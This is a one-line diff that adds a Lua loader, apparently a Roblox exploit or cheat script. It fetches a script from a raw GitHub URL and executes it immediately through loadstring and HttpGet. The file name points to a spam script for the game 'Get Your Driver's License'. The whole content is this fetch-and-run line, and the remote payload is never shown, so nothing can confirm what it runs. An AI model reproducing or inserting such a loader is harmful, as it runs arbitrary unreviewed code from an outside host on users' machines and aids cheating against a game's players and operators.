@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/get-your-driver-s-license-spam7-w2z471suhyh4y7.lua"))()
